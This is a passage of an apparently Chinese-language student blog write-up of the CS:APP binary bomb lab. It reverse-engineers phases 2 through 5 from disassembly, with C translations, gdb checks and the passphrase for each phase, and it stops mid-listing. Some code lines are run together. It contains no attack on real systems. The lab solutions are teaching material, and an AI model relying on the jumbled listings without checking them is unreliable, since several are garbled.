<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span>* pos[<span class="number">3</span>];                       </span><br><span class="line">num0_pos = start_pos;              </span><br><span class="line">num1_pos = start_pos + <span class="number">1</span>;         </span><br><span class="line">tmp_pos  = start_pos + <span class="number">5</span>;          </span><br><span class="line">pos[<span class="number">1</span>]   = tmp_pos; tmp_pos  = start_pos + <span class="number">4</span>; </span><br><span class="line">pos[<span class="number">0</span>] = tmp_pos; </span><br><span class="line">num3_pos = start_pos + <span class="number">3</span>;           </span><br><span class="line">num2_pos = start_pos + <span class="number">2</span>;</span><br></pre></td></tr></table></figure>
<p>于是得到各地址保存的位置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%rdx &#x3D; %rsi</span><br><span class="line">%rcx &#x3D; %rsi + 4</span><br><span class="line">%r8 &#x3D; %rsi + 8</span><br><span class="line">%r9 &#x3D; %rsi + 12</span><br><span class="line">0x0(%rsp) &#x3D; %rsi + 16</span><br><span class="line">0x8(%rsp) &#x3D; %rsi + 20</span><br></pre></td></tr></table></figure>
<p>由上一节知，%rsi 寄存器存放的是调用者 %rsp 寄存器中的内容，因此这 6 个地址分别对应调用者栈里开始的 6 个连续 int 的地址。</p>
<h4 id="回到phase_2函数部分"><a class="markdownIt-Anchor" href="#回到phase_2函数部分"></a> 回到phase_2函数部分</h4>
<p>由之前的分析，我们确定了函数 <code>read_six_numbers</code> 的具体作用。此时栈内保存的信息为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x0(%rsp) &#x3D; nums[0]</span><br><span class="line">0x4(%rsp) &#x3D; nums[1]</span><br><span class="line">0x8(%rsp) &#x3D; nums[2]</span><br><span class="line">0xc(%rsp) &#x3D; nums[3]</span><br><span class="line">0x10(%rsp) &#x3D; nums[4]</span><br><span class="line">0x14(%rsp) &#x3D; nums[5]</span><br></pre></td></tr></table></figure>
<p>其中，<code>nums[0]</code> ~ <code>nums[5]</code> 表示输入的字符串中解析得到的（前）6 个整数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400f0a: 83 3c 24 01            cmpl   $0x1,(%rsp)</span><br><span class="line">400f0e:    74 20                  je     400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">400f10:    e8 25 05 00 00         callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">400f15:    eb 19                  jmp    400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">400f17:    8b 43 fc               mov    -0x4(%rbx),%eax</span><br><span class="line">400f1a:    01 c0                  add    %eax,%eax</span><br><span class="line">400f1c:    39 03                  cmp    %eax,(%rbx)</span><br><span class="line">400f1e:    74 05                  je     400f25 &lt;phase_2+0x29&gt;</span><br><span class="line">400f20:    e8 15 05 00 00         callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">400f25:    48 83 c3 04            add    $0x4,%rbx</span><br><span class="line">400f29:    48 39 eb               cmp    %rbp,%rbx</span><br><span class="line">400f2c:    75 e9                  jne    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">400f2e:    eb 0c                  jmp    400f3c &lt;phase_2+0x40&gt;</span><br><span class="line">400f30:    48 8d 5c 24 04         lea    0x4(%rsp),%rbx</span><br><span class="line">400f35:    48 8d 6c 24 18         lea    0x18(%rsp),%rbp</span><br><span class="line">400f3a:    eb db                  jmp    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">400f3c:    48 83 c4 28            add    $0x28,%rsp</span><br><span class="line">400f40:    5b                     pop    %rbx</span><br><span class="line">400f41:    5d                     pop    %rbp</span><br><span class="line">400f42:    c3                     retq</span><br></pre></td></tr></table></figure>
<p>这段的结构比较复杂。先直译成含 <code>goto</code> 语句的 C 语言代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">if</span> (nums[<span class="number">0</span>] == <span class="number">1</span>)               </span><br><span class="line">    <span class="keyword">goto</span> L_400f30;   </span><br><span class="line">    explode_bomb();    </span><br><span class="line">    <span class="keyword">goto</span> L_400f30;</span><br><span class="line">    L_400f17:                         </span><br><span class="line">    target = *(cur_pos - <span class="number">1</span>);        </span><br><span class="line">	target *= <span class="number">2</span>;    </span><br><span class="line"><span class="keyword">if</span> (*cur_pos == target)        </span><br><span class="line">    <span class="keyword">goto</span> L_400f25;    </span><br><span class="line">explode_bomb(); </span><br><span class="line">L_400f25:                           </span><br><span class="line">cur_pos += <span class="number">1</span>;    </span><br><span class="line"><span class="keyword">if</span> (cur_pos != end_pos)         </span><br><span class="line">    <span class="keyword">goto</span> L_400f17;    </span><br><span class="line"><span class="keyword">goto</span> L_400f3c; L_400f30:                          </span><br><span class="line">cur_pos = nums + <span class="number">1</span>;    </span><br><span class="line">end_pos = nums + <span class="number">6</span>;    </span><br><span class="line"><span class="keyword">goto</span> L_400f17; L_400f3c:                         </span><br><span class="line"><span class="keyword">return</span> target;</span><br></pre></td></tr></table></figure>
<p>整理得到：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (nums[<span class="number">0</span>] != <span class="number">1</span>)    </span><br><span class="line">explode_bomb(); </span><br><span class="line">end_pos = nums + <span class="number">6</span>;</span><br><span class="line"><span class="keyword">for</span> (cur_pos = nums + <span class="number">1</span>; cur_pos != end_pos; ++cur_pos) </span><br><span class="line">&#123;    </span><br><span class="line">	target = *(cur_pos - <span class="number">1</span>) * <span class="number">2</span>;    </span><br><span class="line"> 	<span class="keyword">if</span> (*cur_pos != target)        </span><br><span class="line">     	explode_bomb(); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> target;</span><br></pre></td></tr></table></figure>
<p>通过这段代码，需要输入的 6 个整数就很显然了——第 1 个整数应当为 <code>1</code>，之后的每个整数都是前一个数的 2 倍。于是需要输入的 6 个整数依次为 <code>1</code>, <code>2</code>, <code>4</code>, <code>8</code>, <code>16</code>, <code>32</code>。</p>
<p>由之前的分析，本关密码即为 <code>1 2 4 8 16 32</code>。</p>
<p>在 <code>gdb</code> 中输入 <code>Phase 2</code> 的密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">That&#39;s number 2.  Keep going!</span><br></pre></td></tr></table></figure>
<h3 id="运行结果-2"><a class="markdownIt-Anchor" href="#运行结果-2"></a> 运行结果：</h3>
<p><img src="/2020/04/05/1/phase2.png" alt></p>
<h2 id="phase_3"><a class="markdownIt-Anchor" href="#phase_3"></a> phase_3</h2>
<h3 id="实验过程-3"><a class="markdownIt-Anchor" href="#实验过程-3"></a> 实验过程</h3>
<p>main函数和前面实验过程一样，直接看<code>phase_3</code>函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400f43 &lt;phase_3&gt;:</span><br><span class="line">  400f43:  48 83 ec 18            sub    $0x18,%rsp</span><br><span class="line">  400f47:  48 8d 4c 24 0c         lea    0xc(%rsp),%rcx</span><br><span class="line">  400f4c:  48 8d 54 24 08         lea    0x8(%rsp),%rdx</span><br><span class="line">  400f51:  be cf 25 40 00         mov    $0x4025cf,%esi</span><br><span class="line">  400f56:  b8 00 00 00 00         mov    $0x0,%eax</span><br><span class="line">  400f5b:  e8 90 fc ff ff         callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  400f60:  83 f8 01               cmp    $0x1,%eax</span><br><span class="line">  400f63:  7f 05                  jg     400f6a &lt;phase_3+0x27&gt;</span><br><span class="line">  400f65:  e8 d0 04 00 00         callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f6a:  83 7c 24 08 07         cmpl   $0x7,0x8(%rsp)</span><br><span class="line">  400f6f:  77 3c                  ja     400fad &lt;phase_3+0x6a&gt;</span><br><span class="line">  400f71:  8b 44 24 08            mov    0x8(%rsp),%eax</span><br><span class="line">  400f75:  ff 24 c5 70 24 40 00   jmpq   *0x402470(,%rax,8)</span><br><span class="line">  400f7c:  b8 cf 00 00 00         mov    $0xcf,%eax</span><br><span class="line">  400f81:  eb 3b                  jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f83:  b8 c3 02 00 00         mov    $0x2c3,%eax</span><br><span class="line">  400f88:  eb 34                  jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f8a:  b8 00 01 00 00         mov    $0x100,%eax</span><br><span class="line">  400f8f:  eb 2d                  jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f91:  b8 85 01 00 00         mov    $0x185,%eax</span><br><span class="line">  400f96:  eb 26                  jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f98:  b8 ce 00 00 00         mov    $0xce,%eax</span><br><span class="line">  400f9d:  eb 1f                  jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f9f:  b8 aa 02 00 00         mov    $0x2aa,%eax</span><br><span class="line">  400fa4:  eb 18                  jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fa6:  b8 47 01 00 00         mov    $0x147,%eax</span><br><span class="line">  400fab:  eb 11                  jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fad:  e8 88 04 00 00         callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fb2:  b8 00 00 00 00         mov    $0x0,%eax</span><br><span class="line">  400fb7:  eb 05                  jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fb9:  b8 37 01 00 00         mov    $0x137,%eax</span><br><span class="line">  400fbe:  3b 44 24 0c            cmp    0xc(%rsp),%eax</span><br><span class="line">  400fc2:  74 05                  je     400fc9 &lt;phase_3+0x86&gt;</span><br><span class="line">  400fc4:  e8 71 04 00 00         callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fc9:  48 83 c4 18            add    $0x18,%rsp</span><br><span class="line">  400fcd:  c3                     retq</span><br></pre></td></tr></table></figure>
<p>首先看到进入函数后首先把栈顶指针%rsp寄存器向下减了8位，然后将（%rsp+8）和（%rsp+12）中的内容存在%rdx和%rcx寄存器中。再往后看，出现了一个奇怪的地址，我们将这个地址打印出来，显示的是“%d %d”，这个同第二题一样，表示我们输入的格式，应该输入两个数，中间使用空格进行区分。</p>
<p>然后调用了<code>&lt;__isoc99_sscanf@plt&gt;</code>函数，将返回值与1进行比较，如果输入的数量大于1，则进行跳转，否则引爆炸弹。经过与前面进行比较与推断，可知分辨要将输入的两个数保存在%rdx和%rcx寄存器中。然后将0x8（%rsp）即%rdx的数值与7进行比较，如果大于7的话，就引爆炸弹，否则继续执行，考虑到跳转指令使用的<code>ja</code>指令，由此可知对应的第一个数的输入范围是[0,7]。向下看，发现将0x8(%rsp)中的值放到了%eax中。</p>
<p>下一条指令使用的是<code>jmpq *0x402470(,%rax,8)</code>，这是一条switch语句的命令，根据输入的第一个参数的内容对基于<code>*0x402470</code>的首地址进行跳转，第一个参数有八个取值，从0到7，我们逐一测试。</p>
<p>这里以nums[0]取1为例，此时<code>0x402470(,%rax,8)</code>的值为<code>0x402470 + 1 * 8 = 0x402478</code>。使用gdb查看改地址存放的地址：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) x&#x2F;g 0x402470 + 1 * 8</span><br></pre></td></tr></table></figure>
<p>输出信息：</p>
<p><code>0x402478: 0x0000000000400fb9</code></p>
<p>因此 400fb9: <code>mov $0x137,%eax</code> 即为 <code>nums[0]</code> 取 <code>1</code> 时跳转到的语句。</p>
<p>类似地，我们可以得到 <code>nums[0]</code> 取 [0, 7] 时对应的整个跳转表，从而得到以下 C 语言代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (nums[<span class="number">0</span>]) &#123;                          *<span class="comment">// result in %eax*   </span></span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>: result = <span class="number">0xcf</span>; <span class="keyword">break</span>;           *<span class="comment">// 0x400f7c*    </span></span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>: result = <span class="number">0x137</span>; <span class="keyword">break</span>;          *<span class="comment">// 0x400fb9*    </span></span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>: result = <span class="number">0x2c3</span>; <span class="keyword">break</span>;          *<span class="comment">// 0x400f83*    </span></span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>: result = <span class="number">0x100</span>; <span class="keyword">break</span>;          *<span class="comment">// 0x400f8a*    </span></span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>: result = <span class="number">0x185</span>; <span class="keyword">break</span>;          *<span class="comment">// 0x400f91*    </span></span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>: result = <span class="number">0xce</span>; <span class="keyword">break</span>;           *<span class="comment">// 0x400f98*    </span></span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>: result = <span class="number">0x2aa</span>; <span class="keyword">break</span>;          *<span class="comment">// 0x400f9f*    </span></span><br><span class="line"><span class="keyword">case</span> <span class="number">7</span>: result = <span class="number">0x147</span>; <span class="keyword">break</span>;          *<span class="comment">// 0x400fa6* &#125;                                           *// 0x400fbe* </span></span><br><span class="line"><span class="keyword">if</span> (result != nums[<span class="number">1</span>])                      *<span class="comment">// nums[1] = 0xc(%rsp)*    explode_bomb(); </span></span><br><span class="line"><span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>
<p>通过这段代码，可以发现 <code>nums[0]</code> 经跳转后得到的新数 <code>result</code> 就应当为 <code>nums[1]</code>，</p>
<p>于是得到本关的 8 组解：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0 207&#96;, &#96;1 311&#96;, &#96;2 707&#96;, &#96;3 256&#96;, &#96;4 389&#96;, &#96;5 206&#96;, &#96;6 682&#96;, &#96;7 327</span><br></pre></td></tr></table></figure>
<p>输入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0207</span><br></pre></td></tr></table></figure>
<p>输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Halfway there!</span><br></pre></td></tr></table></figure>
<h2 id="phase_4"><a class="markdownIt-Anchor" href="#phase_4"></a> Phase_4</h2>
<h3 id="实验过程-4"><a class="markdownIt-Anchor" href="#实验过程-4"></a> 实验过程</h3>
<p>找到<code>phase_4</code>函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;phase_4&gt;:</span><br><span class="line"> 40100c:  48 83 ec 18            sub    $0x18,%rsp</span><br><span class="line"> 401010:  48 8d 4c 24 0c         lea    0xc(%rsp),%rcx</span><br><span class="line"> 401015:  48 8d 54 24 08         lea    0x8(%rsp),%rdx</span><br><span class="line"> 40101a:  be cf 25 40 00         mov    $0x4025cf,%esi</span><br><span class="line"> 40101f:  b8 00 00 00 00         mov    $0x0,%eax</span><br><span class="line"> 401024:  e8 c7 fb ff ff         callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line"> 401029:  83 f8 02               cmp    $0x2,%eax</span><br><span class="line"> 40102c:  75 07                  jne    401035 &lt;phase_4+0x29&gt;</span><br><span class="line"> 40102e:  83 7c 24 08 0e         cmpl   $0xe,0x8(%rsp)</span><br><span class="line"> 401033:  76 05                  jbe    40103a &lt;phase_4+0x2e&gt;</span><br><span class="line"> 401035:  e8 00 04 00 00         callq  40143a &lt;explode_bomb&gt;</span><br><span class="line"> 40103a:  ba 0e 00 00 00         mov    $0xe,%edx</span><br><span class="line"> 40103f:  be 00 00 00 00         mov    $0x0,%esi</span><br><span class="line"> 401044:  8b 7c 24 08            mov    0x8(%rsp),%edi</span><br><span class="line"> 401048:  e8 81 ff ff ff         callq  400fce &lt;func4&gt;</span><br><span class="line"> 40104d:  85 c0                  test   %eax,%eax</span><br><span class="line"> 40104f:  75 07                  jne    401058 &lt;phase_4+0x4c&gt;</span><br><span class="line"> 401051:  83 7c 24 0c 00         cmpl   $0x0,0xc(%rsp)</span><br><span class="line"> 401056:  74 05                  je     40105d &lt;phase_4+0x51&gt;</span><br><span class="line"> 401058:  e8 dd 03 00 00         callq  40143a &lt;explode_bomb&gt;</span><br><span class="line"> 40105d:  48 83 c4 18            add    $0x18,%rsp</span><br><span class="line"> 401061:  c3                     retq</span><br></pre></td></tr></table></figure>
<p>得到：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%rdx &#x3D; %rsp + 8</span><br><span class="line">%rcx &#x3D; %rsp + 12</span><br></pre></td></tr></table></figure>
<p>由上一关的分析，本关密码同样应当是输入 2 个整数（之间有且仅有一个空格），这 2 个整数将被保存在之前 2 个参数所提供的 2 个地址中。</p>
<p>因此读取完毕后，栈内保存的信息为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x8(%rsp) &#x3D; nums[0]</span><br><span class="line">0xc(%rsp) &#x3D; nums[1]</span><br></pre></td></tr></table></figure>
<p>其中，<code>nums[0]</code> 和 <code>nums[1]</code> 表示输入的字符串中解析得到的（前）2 个整数。</p>
<p>401029: <code>cmp $0x2,%eax</code> 和 40102c: <code>jne 401035</code> 判断函数 <code>sscanf</code> 的返回值是否等于 <code>2</code>，是则继续执行之后的语句，否则直接跳到 401035: <code>callq 40143a</code> 引爆炸弹。同上一关的说明，即检查是否成功读入且仅读入了 2 个整数，如果不是则直接引爆炸弹。</p>
<p>40102e: <code>cmpl $0xe,0x8(%rsp)</code> 和 401033: <code>jbe 40103a</code> 判断 <code>0x8(%rsp)</code> 的值（即 <code>nums[0]</code>，也就是输入的第 1 个整数）是否不超过 <code>14</code>，是则直接跳到 40103a: <code>mov $0xe,%edx</code>，否则执行 401035: <code>callq 40143a</code> 引爆炸弹。</p>
<p>因此，输入的第 1 个整数应当不超过 <code>14</code>（无符号数），即其取值范围为 [0, 14]。</p>
<p>40103a: <code>mov $0xe,%edx</code>、40103f: <code>mov $0x0,%esi</code> 和 401044: <code>mov 0x8(%rsp),%edi</code> 将 %edx、%esi、%edi 寄存器分别赋值为 <code>0xe</code>、<code>0x0</code>、<code>0x8(%rsp)</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%edi &#x3D; 0x8(%rsp) &#x3D; nums[0]</span><br><span class="line">%esi &#x3D; 0</span><br><span class="line">%edx &#x3D; 14</span><br></pre></td></tr></table></figure>
<p>401048: <code>callq 400fce</code> 调用函数 <code>func4</code>，也就是本关的主体部分。</p>
<h5 id="422-观察函数-func4"><a class="markdownIt-Anchor" href="#422-观察函数-func4"></a> 4.2.2 观察函数 func4</h5>
<p>在 bomb.asm 中找到函数 <code>func4</code> 对应的汇编语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;func4&gt;:  400fce:   48 83 ec 08</span><br><span class="line">sub    $0x8,%rsp  400fd2:   89 d0                  </span><br><span class="line">mov    %edx,%eax  400fd4:   29 f0                   </span><br><span class="line">sub    %esi,%eax  400fd6:   89 c1                 </span><br><span class="line">mov    %eax,%ecx  400fd8:   c1 e9 1f             </span><br><span class="line">shr    $0x1f,%ecx  400fdb:   01 c8                   </span><br><span class="line">add    %ecx,%eax  400fdd:   d1 f8                 </span><br><span class="line">sar    %eax  400fdf:   8d 0c 30               </span><br><span class="line">lea    (%rax,%rsi,1),%ecx  400fe2:   39 f9               </span><br><span class="line">cmp    %edi,%ecx  400fe4:   7e 0c                 </span><br><span class="line">jle    400ff2 &lt;func4+0x24&gt;  400fe6:   8d 51 ff          </span><br><span class="line">lea    -0x1(%rcx),%edx  400fe9:   e8 e0 ff ff ff         </span><br><span class="line">callq  400fce &lt;func4&gt;  400fee:   01 c0                 </span><br><span class="line">add    %eax,%eax  400ff0:   eb 15                   </span><br><span class="line">jmp    401007 &lt;func4+0x39&gt;  400ff2:   b8 00 00 00 00       </span><br><span class="line">mov    $0x0,%eax  400ff7:   39 f9                   </span><br><span class="line">cmp    %edi,%ecx  400ff9:   7d 0c                   </span><br><span class="line">jge    401007 &lt;func4+0x39&gt;  400ffb:   8d 71 01             </span><br><span class="line">lea    0x1(%rcx),%esi  400ffe:   e8 cb ff ff ff        </span><br><span class="line">callq  400fce &lt;func4&gt;  401003:   8d 44 00 01           </span><br><span class="line">lea    0x1(%rax,%rax,1),%eax  401007:   48 83 c4 08        </span><br><span class="line">add    $0x8,%rsp  40100b:   c3                     </span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
<p>400fe9 和 400ffe: <code>callq 400fce</code> 都调用了函数 <code>func4</code> 自身，可见这是一个递归函数。</p>
<p>试译成 C 语言代码（经整理及部分改写，类似 2.2.3 节的处理流程）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">*<span class="comment">// key in %edi, low in %esi, high in %edx* </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func4</span><span class="params">(<span class="keyword">int</span> key, <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span> </span>&#123;   </span><br><span class="line">	<span class="keyword">int</span>      length   = high - low;             *<span class="comment">// length in %eax*   </span></span><br><span class="line">	<span class="keyword">unsigned</span> sign     = length &gt;&gt; <span class="number">31</span>;           *<span class="comment">// sign in %ecx*    </span></span><br><span class="line">	<span class="keyword">int</span>      half_len = (length + sign) &gt;&gt; <span class="number">1</span>;   *<span class="comment">// half_len in %eax*                                                *// half_len = length /= 2*    </span></span><br><span class="line">	<span class="keyword">int</span> mid = half_len + low;                   *<span class="comment">// mid in %ecx*    </span></span><br><span class="line">	<span class="keyword">int</span> result;                                 *<span class="comment">// result in %eax*    </span></span><br><span class="line">	<span class="keyword">if</span> (mid &gt; key) &#123;       </span><br><span class="line">	high   = mid - <span class="number">1</span>;        </span><br><span class="line">	result = func4(key, low, high) * <span class="number">2</span>;    </span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (mid &gt;= key) &#123;                    *<span class="comment">// </span></span><br><span class="line">	mid == key*        result = <span class="number">0</span>;    &#125; </span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;                                    *<span class="comment">// mid &lt; key*        </span></span><br><span class="line">		low    = mid + <span class="number">1</span>;        </span><br><span class="line">		result = func4(key, low, high) * <span class="number">2</span> + <span class="number">1</span>;    </span><br><span class="line">	&#125;    </span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="423-回到函数-phase_4"><a class="markdownIt-Anchor" href="#423-回到函数-phase_4"></a> 4.2.3 回到函数 phase_4</h5>
<blockquote>
<p>%eax = func4(nums[0], 0, 14)</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1234567  40104d:   85 c0                   test   %eax,%eax</span><br><span class="line">  40104f:   75 07                   jne    401058 &lt;phase_4+0x4c&gt;</span><br><span class="line">  401051:   83 7c 24 0c 00          cmpl   $0x0,0xc(%rsp)</span><br><span class="line">  401056:   74 05                   je     40105d &lt;phase_4+0x51&gt;</span><br><span class="line">  401058:   e8 dd 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40105d:   48 83 c4 18             add    $0x18,%rsp</span><br><span class="line">  401061:   c3                      retq</span><br></pre></td></tr></table></figure>
<p>40104d: <code>test %eax,%eax</code> 和 40104f: <code>jne 401058</code> 判断函数 <code>func4</code> 的返回值是否为 <code>0</code>，是则继续执行之后的语句，否则直接跳到 401058: <code>callq 40143a</code> 引爆炸弹。</p>
<p>因此，输入的第 1 个整数 <code>nums[0]</code> 需要使函数 <code>func4(nums[0], 0, 14)</code> 的返回值为 <code>0</code>，其中 <code>nums[0]</code> 的取值范围为 [0, 14]。</p>
<p>401051: <code>cmpl $0x0,0xc(%rsp)</code> 和 401056: <code>je 40105d</code> 判断 <code>0xc(%rsp)</code> 的值（即 <code>nums[1]</code>，也就是输入的第 2 个整数）是否为 <code>0</code>，是则直接跳到 40105d: <code>add $0x18,%rsp</code> 弹栈返回，否则执行 401058: <code>callq 40143a</code> 引爆炸弹。</p>
<p>因此，输入的第 2 个整数应当为 <code>0</code>。</p>
<h5 id="424-确定输入的第-1-个整数"><a class="markdownIt-Anchor" href="#424-确定输入的第-1-个整数"></a> 4.2.4 确定输入的第 1 个整数</h5>
<p>事实上，由于 <code>nums[0]</code> 的取值范围有限，直接遍历然后测试返回值是否为 <code>0</code> 即可。测试代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Solution</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> kBegin = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> kEnd   = <span class="number">14</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The solutions are:"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = kBegin; i &lt;= kEnd; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (func4(i, kBegin, kEnd) == <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">" %d"</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">The solutions are: 0 1 3 7</span><br></pre></td></tr></table></figure>
<p>即为第 1 个整数可能的值。</p>
<p>综上，本关密码即为 <code>0 0</code>, <code>1 0</code>, <code>3 0</code>, <code>7 0</code>。</p>
<h5 id="425-测试"><a class="markdownIt-Anchor" href="#425-测试"></a> 4.2.5 测试</h5>
<p>这里以 <code>7 0</code> 为例，在 gdb 中输入 Phase 4 的密码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7 0</span><br></pre></td></tr></table></figure>
<p>输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">So you got that one.  Try this one.</span><br></pre></td></tr></table></figure>
<h3 id="5-phase-5-pointers"><a class="markdownIt-Anchor" href="#5-phase-5-pointers"></a> 5. Phase 5: pointers</h3>
<h4 id="51-本关密码"><a class="markdownIt-Anchor" href="#51-本关密码"></a> 5.1 本关密码</h4>
<p><code>9ON567</code>（不唯一）</p>
<h4 id="52-解题过程"><a class="markdownIt-Anchor" href="#52-解题过程"></a> 5.2 解题过程</h4>
<blockquote>
<p>%rdi = input</p>
</blockquote>
<h5 id="521-观察函数-phase_5"><a class="markdownIt-Anchor" href="#521-观察函数-phase_5"></a> 5.2.1 观察函数 phase_5</h5>
<p>在 bomb.asm 中找到函数 <code>phase_5</code> 对应的汇编语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;phase_5&gt;:</span><br><span class="line"> 401062:   53                      push   %rbx</span><br><span class="line"> 401063:   48 83 ec 20             sub    $0x20,%rsp</span><br><span class="line"> 401067:   48 89 fb                mov    %rdi,%rbx</span><br><span class="line"> 40106a:   64 48 8b 04 25 28 00    mov    %fs:0x28,%rax</span><br><span class="line"> 401071:   00 00</span><br><span class="line"> 401073:   48 89 44 24 18          mov    %rax,0x18(%rsp)</span><br><span class="line"> 401078:   31 c0                   xor    %eax,%eax</span><br><span class="line"> 40107a:   e8 9c 02 00 00          callq  40131b &lt;string_length&gt;</span><br><span class="line"> 40107f:   83 f8 06                cmp    $0x6,%eax</span><br><span class="line"> 401082:   74 4e                   je     4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line"> 401084:   e8 b1 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line"> 401089:   eb 47                   jmp    4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line"> 40108b:   0f b6 0c 03             movzbl (%rbx,%rax,1),%ecx</span><br><span class="line"> 40108f:   88 0c 24                mov    %cl,(%rsp)</span><br><span class="line"> 401092:   48 8b 14 24             mov    (%rsp),%rdx</span><br><span class="line"> 401096:   83 e2 0f                and    $0xf,%edx</span><br><span class="line"> 401099:   0f b6 92 b0 24 40 00    movzbl 0x4024b0(%rdx),%edx</span><br><span class="line"> 4010a0:   88 54 04 10             mov    %dl,0x10(%rsp,%rax,1)</span><br><span class="line"> 4010a4:   48 83 c0 01             add    $0x1,%rax</span><br><span class="line"> 4010a8:   48 83 f8 06             cmp    $0x6,%rax</span><br><span class="line"> 4010ac:   75 dd                   jne    40108b &lt;phase_5+0x29&gt;</span><br><span class="line"> 4010ae:   c6 44 24 16 00          movb   $0x0,0x16(%rsp)</span><br><span class="line"> 4010b3:   be 5e 24 40 00          mov    $0x40245e,%esi</span><br><span class="line"> 4010b8:   48 8d 7c 24 10          lea    0x10(%rsp),%rdi</span><br><span class="line"> 4010bd:   e8 76 02 00 00          callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line"> 4010c2:   85 c0                   test   %eax,%eax</span><br><span class="line"> 4010c4:   74 13                   je     4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line"> 4010c6:   e8 6f 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line"> 4010cb:   0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)</span><br><span class="line"> 4010d0:   eb 07                   jmp    4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line"> 4010d2:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line"> 4010d7:   eb b2                   jmp    40108b &lt;phase_5+0x29&gt;</span><br><span class="line"> 4010d9:   48 8b 44 24 18          mov    0x18(%rsp),%rax</span><br><span class="line"> 4010de:   64 48 33 04 25 28 00    xor    %fs:0x28,%rax</span><br><span class="line"> 4010e5:   00 00</span><br><span class="line"> 4010e7:   74 05                   je     4010ee &lt;phase_5+0x8c&gt;</span><br><span class="line"> 4010e9:   e8 42 fa ff ff          callq  400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line"> 4010ee:   48 83 